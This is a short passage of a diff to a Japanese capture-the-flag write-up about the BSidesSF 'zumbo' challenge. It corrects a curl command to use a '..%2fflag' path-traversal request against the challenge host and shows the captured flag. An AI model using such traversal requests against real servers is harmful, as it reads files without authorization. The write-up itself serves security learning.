@@ -261,7 +261,7 @@ def custom_page(page):
     return flask.render_template_string(template, name='test', counter=counter);
 ```
 
-とあります。`curl http://zumbo-8ac445b1.ctf.bsidessf.net/%2fflag` でフラグが出てきました。
+とあります。~~`curl http://zumbo-8ac445b1.ctf.bsidessf.net/%2fflag`~~ `curl http://zumbo-8ac445b1.ctf.bsidessf.net/..%2fflag` でフラグが出てきました。
 
 ```
 FLAG: RUNNER_ON_SECOND_BASE
